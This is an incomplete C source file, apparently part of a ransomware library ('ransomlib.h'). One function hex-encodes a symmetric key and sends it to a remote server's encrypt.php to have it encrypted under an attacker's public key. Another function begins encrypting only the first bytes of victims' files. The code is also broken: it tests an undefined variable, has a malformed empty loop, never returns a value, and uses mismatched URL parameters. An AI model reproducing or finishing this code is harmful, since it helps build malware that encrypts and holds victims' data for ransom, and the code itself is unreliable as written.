#include "ransomlib.h"
#include "thirdparty/b64.h"
#include "weakcrypt.h"
#include "common.h"
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>

int encryptSymmetricKey(char** encrypted_key, const int pubkeyid, const char* key){
	//Get key in hex
	char* hexkey=b16encode(key,SYMMETRIC_KEY_SIZE);
	
	//Base url
	const char* base_url=SERVER_OSIR_HOME "/client-interface/encrypt.php";
	
	//Allocate memory for url
	char* url=(char*)malloc(sizeof(char)*(strlen(base_url)+2+strlen(hexkey)+strlen("?pubid=&symkey=")));
	
	//Make string from public key id
	char pki_string[5];
	itoa(pubkeyid,pki_string,10);
	
	//Make url
	strcpy(url,base_url);
	strcat(url,"?keyid=");
	strcat(url,pki_string);
	strcat(url,"&symkey=");
	strcat(url,hexkey);
	strcat(url,"\0");
	
	//Get encrypted key
	int ret=decryptRemoteBytes(encrypted_key,url);
	
	//Deallocate memory and return encrypted key size
	free(url);
	free(hexkey);
	return ret;
}

bool partialEncryptFile(const char* key, const char* filename, long int number_of_bytes){
	
	//Open target file
	FILE* fp=fopen(filename,"rb");
	if(bf==NULL){fprintf(stderr, "Error: partialEncryptFile: could not open file\n");return 0;}
	
	//Get file size
	fseek(fp,0,SEEK_END);
	long int file_size=ftell(fp);
	
	//Check for errors
	if(file_size==-1){fprintf(stderr, "Error: partialEncryptFile: ftell returned error\n");return 0;}
	
	//Set number_of_bytes to file size if necessary
	number_of_bytes=file_size<number_of_bytes?file_size:number_of_bytes;
	
	//Reset iterator
	fseek(fp,0,SEEK_SET);
	
	//Get first X bytes of file
	char* clear_bytes=(char*)malloc(sizeof(char)*number_of_bytes);
	for(long int i=0;i<number_of_bytes){
		
	}
	
}